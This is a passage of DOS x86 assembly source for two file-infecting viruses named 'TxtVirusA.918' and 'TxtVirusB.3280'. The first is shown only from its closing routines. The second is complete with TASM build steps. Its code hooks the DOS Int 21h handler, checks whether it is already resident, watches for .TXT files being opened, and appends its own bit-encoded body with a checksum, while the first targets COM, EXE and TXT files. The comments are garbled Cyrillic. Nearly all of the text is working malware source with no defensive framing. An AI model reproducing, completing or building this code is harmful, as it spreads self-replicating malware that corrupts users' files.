   ;[Žá¢®¡®¦¤ ¥¬ ¯ ¬ïâì]

   Release:    mov ah, 49h
           int 65h


   ;[‡ ªàë¢ ¥¬ ä ©«]

   CloseA:     mov ah, 3Eh
           int 65h
           jmp Quit

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ










   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   ;                             *Ž„**Žƒ*€ŒŒ›
   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   CvtByte:    mov cx, 8
           mov dx, Buffer-Virus
           call    Read
           jc  Return

           cld
           mov cx, 8
           xor ax, ax
           mov si, dx
   Loop2:      lodsb
           neg al
           cmp al, 1
           ja  BadRet
           ror al, cl
           or  ah, al
           loop    Loop2
           xchg    ah, al
   GoodRet:    clc
           ret

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   TestExt:    add di, 3
           mov al, ds:[si-3]
           and al, 0DFh
           cmp al, cs:[di-3]
           jne Return
           mov ax, ds:[si-2]
           and ax, 0DFDFh
           cmp ax, cs:[di-2]
   Return:     ret

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   Calc:       mov cx, 512
           div cx
           or  dx, dx
           jz  $+3
           inc ax
           ret

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   GetFSize:   mov al, 2
           jmp $+4
   SeekStart:  mov al, 0
           mov ah, 42h
           xor cx, cx
           xor dx, dx
           int 65h
           ret

   SeekEnd:    mov ax, 4202h
           mov cx, -1
           int 65h
           jc  Return
           cmp dx, 0
           jge GoodRet
   BadRet:     stc
           ret

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   WriteVirus: xor dx, dx
   Write:      mov ah, 40h
           jmp $+4
   Read:       mov ah, 3Fh
   Int65h:     push    cs
           pop ds
           int 65h
           ret

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ










   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   ;                                „€**›…
   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   VirName     db  'TxtVirusA.918 -- Copyright (c) by DJ Sadovnikov'

   IF DEBUG
   Extns       db  'COOEXXTXX'
   ELSE
   Extns       db  'COMEXETXT'
   ENDIF
   Old3b       db  0,0,0
   New3b       db  0E9h,0,0

   CodeSize    =   $-Virus

   XXXNS       db  7 dup (?)
   Buffer      db  19h dup (?)
   FSize       dw  ?
   Crc     dw  ?
   Temp        dw  ?

   MemSize     =   ($-Virus)/16 + 1

   Code        ends
           end Virus
   --[txtvir2.asm]----------------------------------------------------------------

   ;    'ð £¡ TxtVirusB.3280
   ;
   ; ?R¿ôð<ð R÷ÿ¢¬ ¡ ôR¿R©¬® TASM 4.1+
   ;
   ;    tasm /m txtvir2.asm
   ;    tlink /x txtvir2.obj
   ;    exe2bin txtvir2.exe
   ;    bin2txt txtvir2.bin txtvir2.txt
   ;
   ;******************************************************************************

           .286
   Code        segment use16
           assume  cs:Code, ds:Code
           org 0

   Virus:      pusha
           push    ds es

           push    cs
           pop ds


   ;[? R÷? ¯?¿ -ÿ<ð§ð? ÷ð £¡ÿ ÷ ôÿ¿¯¢ð]

           mov ax, 7777h
           int 21h
           cmp ax, 6666h
           jne Install
           clc
           jmp Exit


   ;['R¥ ÿ-¯?¿ ¡¢ÿ «c ÷?ò¢R  Int 21h]

   Install:    mov ax, 3521h
           int 21h
           mov ds:[Seg21h], es
           mov ds:[Ofs21h], bx


   ;["¡¢ÿ-ÿ÷<ð÷ÿ?¿ ¡÷Rc Rö ÿöR¢§ðò Int 21h]

           mov ax, 2521h
           mov dx, offset Int21h
           int 21h

           stc
   Exit:       pop es ds
           popa
           retf

   ;******************************************************************************

   Int21h:     cmp ax, 7777h
           jne NoTest
           mov ax, 6666h
           iret

   NoTest:     pusha
           push    ds es

           cmp ah, 3Dh
           jne Quit


   ;[?©?¿ òR-?¦ ð¿?-ð ¤ÿc<ÿ]

           mov si, dx
   SeekZero:   inc si
           cmp ds:[si], byte ptr 0
           jne SeekZero


   ;[?ô ?ý?<¯?¿ ¢ðô ¤ÿc<ÿ]

           mov ax, ds:[si-4]
           and ah, 0DFh
           cmp ax, 'T.'
           jne Quit
           mov ax, ds:[si-2]
           and ax, 0DFDFh
           cmp ax, 'TX'
           jne Quit


   ;[?¢ò «÷ÿ?¿ ¤ÿc<]

           mov ax, 3D02h
           int 65h
           jc  Quit
           xchg    bx, ax
           push    cs
           pop ds


   ;["¡¢ÿ-ÿ÷<ð÷ÿ?¿ £òÿÿ¢?<¬ -ÿ 32 ôRð¦ðð R¢ òR-¦ÿ ¤ÿc<ÿ]

           mov dx, -32
           call    SeekEnd
           jc  Infect


   ;['§ð¢«÷ÿ?¿  ÿ¿?  ýÿ¿ôÿ ð òR-¢ R<¬-£® ¡£¿¿£]

           call    CvtByte1
           jc  Infect
           mov byte ptr ds:[FSize], al
           call    CvtByte1
           jc  Infect
           mov byte ptr ds:[FSize+1], al
           call    CvtByte1
           jc  Infect
           mov byte ptr ds:[Crc], al
           call    CvtByte1
           jc  Infect
           mov byte ptr ds:[Crc+1], al


   ;["¡¢ÿ-ÿ÷<ð÷ÿ?¿ £òÿÿ¢?<¬ -ÿ -ÿ§ÿ<R ýÿ¿ôÿ]

           mov dx, ds:[FSize]
           add dx, 4
           shl dx, 3
           neg dx
           call    SeekEnd
           jc  Infect


   ;['§ð¢ÿ?¿ òR-¢ R<¬-£® ¡£¿¿£]

           xor bp, bp
           xor di, di
   Loop1:      call    CvtByte1
           jc  Infect
           mov ah, 0
           add bp, ax
           inc di
           cmp di, ds:[FSize]
           jne Loop1


   ;[? R÷? ¯?¿ òR-¢ R<¬-£® ¡£¿¿£]

           cmp bp, ds:[Crc]
           jne Infect


   ;[Øÿò «÷ÿ?¿ ¤ÿc<]

   Close:      mov ah, 3Eh
           int 65h


   Quit:       pop es ds
           popa

           db  0EAh
   Ofs21h      dw  0
   Seg21h      dw  0


   ;["¡¢ÿ-ÿ÷<ð÷ÿ?¿ £òÿÿ¢?<¬ ÷ òR-?¦ ¤ÿc<ÿ]

   Infect:     mov ax, 4202h
           xor cx, cx
           xor dx, dx
           int 65h
           jc  Close


   ;[? ?Rö ÿR÷«÷ÿ?¿ ¡÷Rc òRý ð ÿôð¡«÷ÿ?¿ ??R ÷ ¤ÿc<]

           cld
           xor bp, bp
           xor si, si
   Loop2:      lodsb
           mov ah, 0
           add bp, ax
           call    CvtByte2
           jc  Close
           cmp si, CodeSize
           jne Loop2


   ;[? ?Rö ÿR÷«÷ÿ?¿ ð ÿôð¡«÷ÿ?¿  ÿ¿?  ¤ÿc<ÿ ð òR-¢ R<¬-£® ¡£¿¿£]

           mov ax, CodeSize
           call    CvtByte2
           jc  Close
           mov ax, CodeSize
           xchg    ah, al
           call    CvtByte2
           jc  Close
           mov ax, bp
           call    CvtByte2
           jc  Close
           mov ax, bp
           xchg    ah, al
           call    CvtByte2
           jmp Close

   ;******************************************************************************

   CvtByte1:   mov ah, 3Fh
           mov cx, 8
           mov dx, offset Buffer
           int 65h
           jc  Return

           cld
           mov cx, 8
           xor ax, ax
           mov si, dx
   Loop3:      lodsb
           neg al
           cmp al, 1
           ja  BadRet
           ror al, cl
           or  ah, al
           loop    Loop3
           xchg    ah, al
   GoodRet:    clc
           ret

   ;******************************************************************************

   CvtByte2:   mov cx, 8
           mov di, offset Buffer
   Loop4:      mov ds:[di], byte ptr 0
           shr al, 1
           jnc Skip
           mov ds:[di], byte ptr 0FFh
   Skip:       inc di
           loop    Loop4

           mov ah, 40h
           mov cx, 8
           mov dx, offset Buffer
           int 65h
   Return:     ret

   ;******************************************************************************

   SeekEnd:    mov ax, 4202h
           mov cx, -1
           int 65h
           jc  Return
           cmp dx, 0
           jge GoodRet
   BadRet:     stc
           ret

   ;******************************************************************************

   VirName     db  'TxtVirusB.3280 -- Copyright (c) by DJ Sadovnikov'
   Buffer      db  8 dup (0)
   FSize       dw  0
   Crc     dw  0

   CodeSize    =   $-Virus

   Code        ends
           end Virus
